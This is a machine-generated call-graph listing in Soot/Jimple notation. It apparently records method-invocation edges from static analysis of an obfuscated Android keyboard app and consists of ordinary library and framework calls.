VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r3) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
